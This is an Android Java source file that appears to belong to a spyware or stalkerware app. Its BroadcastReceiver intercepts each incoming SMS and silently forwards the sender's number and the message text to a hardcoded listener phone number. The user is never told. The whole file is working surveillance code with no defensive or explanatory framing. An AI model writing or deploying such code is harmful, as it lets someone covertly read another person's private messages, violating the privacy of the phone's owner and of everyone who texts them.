package com.example.hp.findyou;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

public class msgReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Object[] o = (Object[]) intent.getExtras().get("pdus");
        SmsMessage smsmsg = SmsMessage.createFromPdu((byte[])o[0]);
        String phonenum = smsmsg.getDisplayOriginatingAddress();
        String content = smsmsg.getMessageBody();

        String msg = phonenum +" send msg to he:"+content;
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage(MyConstants.listenerNumber, null, msg, null, null);
    }
}
